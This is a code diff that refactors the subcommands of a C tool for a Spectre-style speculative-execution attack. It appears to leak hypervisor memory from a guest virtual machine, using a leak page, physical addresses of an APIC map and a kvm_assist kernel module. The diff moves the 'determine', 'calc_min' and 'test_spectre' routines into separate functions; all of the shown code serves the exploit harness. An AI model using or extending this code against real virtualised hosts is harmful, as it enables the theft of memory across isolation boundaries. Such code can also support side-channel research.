@@ -182,9 +182,11 @@ size_t find_min(void *buf) {
     int64_t batches_left = (MAX_IDX - batch) / BATCH_SIZE;
     double time_left = batches_left * avg_time;
 
+    // Print the remaining time
     fprintf(stderr, "\r%lx / %lx (%.4f%%) (%dh %.2dm %.2ds remaining)\r", batch, (uint64_t)MAX_IDX,
             (float)batch / (float)((uint64_t)MAX_IDX), (int)(time_left / 3600), (int)(time_left / 60) % 60,
             (int)time_left % 60);
+
     for (int64_t offset = ELEMENTS_PER_PAGE - 4; offset >= 0; offset -= 4) {
       for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
         size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;
@@ -209,6 +211,57 @@ size_t find_min(void *buf) {
   return 0;
 }
 
+void cmd_determine(void *leak_page) {
+  *(uint64_t *)leak_page = page_value;
+  getchar();
+  access_buffer_with_spectre(leak_page, 1, 1);
+  *(uint64_t *)leak_page = 0;
+}
+
+void cmd_calc_min(int argc, char *argv[argc]) {
+  if (argc <= 3) {
+    errno = EINVAL;
+    err(errno, "missing args, requires [leak page addr] [apic map addr]");
+  }
+  char *endptr = NULL;
+  uintptr_t leak_page_addr = strtoull(argv[2], &endptr, 16);
+  if (endptr == argv[2]) {
+    errno = EINVAL;
+    err(errno, "Could not parse phys addr of leak page");
+  }
+
+  uintptr_t apic_map_addr = strtoull(argv[3], &endptr, 16);
+  if (endptr == argv[3]) {
+    errno = EINVAL;
+    err(errno, "Could not parse phys addr of apic map");
+  }
+
+  printf("Leak page addr: %lx\tAPIC map addr: %lx\n", leak_page_addr, apic_map_addr);
+  size_t min = calculate_min(leak_page_addr, apic_map_addr);
+  printf("Min: %ld (or 0x%lx)\n", min, min);
+}
+
+void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
+  if (argc <= 2) {
+    errno = EINVAL;
+    err(errno, "missing args, requires min");
+  }
+  char *endptr = NULL;
+  uintptr_t min = strtoull(argv[2], &endptr, 16);
+  if (endptr == argv[2]) {
+    errno = EINVAL;
+    err(errno, "Could not parse min");
+  }
+
+  const size_t iterations = 10000;
+  printf("Running with min %lx\n", min);
+  size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
+  printf("Running with min %lx\n", ~min);
+  size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
+
+  printf("Miss: %ld\tHit: %ld\n", miss, hit);
+}
+
 int main(int argc, char *argv[argc]) {
   struct time_deque d;
   time_deque_init(&d);
@@ -228,50 +281,11 @@ int main(int argc, char *argv[argc]) {
   // Use this to get physical address of the leak page with the
   // kvm_assist.ko module in the hypervisor
   if (!strcmp(argv[1], "determine")) {
-    *(uint64_t *)leak_page = page_value;
-    getchar();
-    access_buffer_with_spectre(leak_page, 1, 1);
-    *(uint64_t *)leak_page = 0;
+    cmd_determine(leak_page);
   } else if (!strcmp(argv[1], "calc_min")) {
-    if (argc <= 3) {
-      errno = EINVAL;
-      err(errno, "missing args, requires [leak page addr] [apic map addr]");
-    }
-    char *endptr = NULL;
-    uintptr_t leak_page_addr = strtoull(argv[2], &endptr, 16);
-    if (endptr == argv[2]) {
-      errno = EINVAL;
-      err(errno, "Could not parse phys addr of leak page");
-    }
-
-    uintptr_t apic_map_addr = strtoull(argv[3], &endptr, 16);
-    if (endptr == argv[3]) {
-      errno = EINVAL;
-      err(errno, "Could not parse phys addr of apic map");
-    }
-
-    printf("Leak page addr: %lx\tAPIC map addr: %lx\n", leak_page_addr, apic_map_addr);
-    size_t min = calculate_min(leak_page_addr, apic_map_addr);
-    printf("Min: %ld (or 0x%lx)\n", min, min);
+    cmd_calc_min(argc, argv);
   } else if (!strcmp(argv[1], "test_spectre")) {
-    if (argc <= 2) {
-      errno = EINVAL;
-      err(errno, "missing args, requires min");
-    }
-    char *endptr = NULL;
-    uintptr_t min = strtoull(argv[2], &endptr, 16);
-    if (endptr == argv[2]) {
-      errno = EINVAL;
-      err(errno, "Could not parse min");
-    }
-
-    const size_t iterations = 10000;
-    printf("Running with min %lx\n", min);
-    size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
-    printf("Running with min %lx\n", ~min);
-    size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
-
-    printf("Miss: %ld\tHit: %ld\n", miss, hit);
+    cmd_test_spectre(argc, argv, leak_page);
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
     printf("Min: %ld (or 0x%lx)\n", min, min);
